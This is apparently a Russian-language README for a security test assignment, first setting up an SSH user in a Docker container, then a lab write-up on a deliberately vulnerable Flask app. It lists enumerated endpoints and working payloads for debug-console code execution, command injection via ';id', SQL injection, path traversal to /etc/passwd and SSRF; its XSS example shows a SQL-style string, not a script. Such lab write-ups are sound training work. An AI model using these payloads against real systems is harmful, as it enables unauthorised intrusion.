# mts-testcase1
Задание 1

Мое окружение
OS: Windows 11
Docker Desktop 4.74.0
Образ: winebrute/testcase1 (Ubuntu 24.04.3 LTS)

1. Запуск контейнера
```bash
docker pull winebrute/testcase1
docker run -it winebrute/testcase1 /bin/bash
```

2. Создание пользователя
```bash
useradd -m -s /bin/bash testuser
passwd testuser
```

3. SSH
```bash
service ssh start
ssh testuser@localhost
```

> Для подключения с хост-машины контейнер запускается с пробросом порта:
> `docker run -it -p 2222:22 winebrute/testcase1 /bin/bash`
> `ssh testuser@localhost -p 2222`

Результат
![результат](https://github.com/user-attachments/assets/98279221-7280-4edc-a86a-f71c8529b5d7)



Задание 2


Мое окружение
Windows 11, Docker Desktop 4.74.0
Запуск: `docker run -p 5000:5000 winebrute/testcase2`
Сервер: Flask / Werkzeug 3.1.3 / Python 3.9.24, debug mode on

Далее перебираем через ffuf:

```bash
ffuf -u http://localhost:5000/FUZZ -w common.txt
```
и находим 8 эндпоинтов: `/admin`, `/console`, `/fetch`, `/help`, `/login`, `/ping`, `/readfile`, `/search`.
![image](https://github.com/user-attachments/assets/920ff5ab-e843-4bc2-a427-acb830d5b2be)


Теперь об уязвимостях:
 1. RCE - Werkzeug Debug Console
Приложение запущено с `debug=True`, консоль `/console` открыта публично. PIN-код виден в stdout контейнера: `114-684-599`. После ввода PIN выполняется произвольный Python-код:

```python
__import__('os').popen('id').read()
# uid=0(root) gid=0(root) groups=0(root)
```
![image](https://github.com/user-attachments/assets/3222f0e9-e360-4ea1-b4ac-20f9da8a786c)

2. Command Injection
`/ping` конкатенирует параметр `host` в системный вызов без санитизации:
```
GET /ping?host=127.0.0.1;id
→ uid=0(root) gid=0(root) groups=0(root)
```
![image](https://github.com/user-attachments/assets/83c22f48-df6d-44cb-8e82-3f391427e5b2)

3. SQL Injection
`/login` уязвим к инъекции в поле `username`:

```
POST /login
username=admin'--&password=anything
Welcome admin! Admin: True
```
![image](https://github.com/user-attachments/assets/92500e65-2a5d-4825-88b8-b7e022d2d981)

 4. Path Traversal
`/readfile` пропускает `../` без фильтрации:
GET /readfile?filename=../../../../etc/passwd
 <pre>This is a test file</pre>
![image](https://github.com/user-attachments/assets/5c930709-5976-43aa-a5ac-b7d4d4737955)


5. SSRF
`/fetch` выполняет запрос по произвольному URL:
GET /fetch?url=http://127.0.0.1:5000/admin
 Fetched: Invalid token: Not enough segments
![image](https://github.com/user-attachments/assets/9b8d035d-ddc5-4597-97a7-792b38d7e078)


6. Reflected XSS
`/search` отражает ввод в HTML без экранирования:

```html
Search Results for: test' OR '1'='1
```
![image](https://github.com/user-attachments/assets/b7ec9a5f-067f-45f0-9bd1-151ab25611c4)


7. Information Disclosure
Заголовок `Server: Werkzeug/3.1.3 Python/3.9.24` раскрывает стек
PIN отладчика в stdout
Полные стек-трейсы при ошибках
